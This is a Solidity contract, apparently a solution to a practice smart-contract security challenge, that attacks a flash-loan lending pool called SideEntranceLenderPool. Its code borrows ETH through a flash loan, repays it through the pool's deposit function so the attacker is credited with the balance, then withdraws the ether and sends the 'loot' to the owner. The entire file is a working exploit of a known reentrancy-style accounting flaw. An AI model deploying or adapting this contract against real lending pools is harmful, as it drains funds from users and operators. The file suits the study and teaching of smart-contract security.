// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "@openzeppelin/contracts/utils/Address.sol";
import "@openzeppelin/contracts/access/Ownable.sol";

import "hardhat/console.sol";

import "./SideEntranceLenderPool.sol";

/**
 * @title SideEntranceAttacker
 * @author soyccan
 * @notice Steal ETH by borrowing a flash loan but pay back by side entrace
 */
contract SideEntranceAttacker is IFlashLoanEtherReceiver, Ownable {
    using Address for address payable;

    SideEntranceLenderPool private immutable pool;

    constructor(address poolAddress) {
        pool = SideEntranceLenderPool(poolAddress);
    }

    // repay the loan by deposit(), so that we can withdraw it back later
    function execute() external payable override {
        console.log("%s borrowed me %s", msg.sender, msg.value);
        payable(address(pool)).functionCallWithValue(
            abi.encodeWithSignature("deposit()"),
            msg.value
        );
        // equivalent to: pool.deposit{value: msg.value}();
    }

    function attack(uint256 amount) external onlyOwner {
        console.log("%s called attack", msg.sender);
        pool.flashLoan(amount);
        pool.withdraw();
    }

    function withdrawLoot(uint256 amount) external onlyOwner {
        console.log("%s withdrew the loot by %s", msg.sender, amount);
        payable(owner()).sendValue(amount);
        // equivalent to: payable(owner()).transfer(amount);
    }

    // a receive ether function (or a fallback function) must be defined in
    // order to receive ether
    receive() external payable {}
}
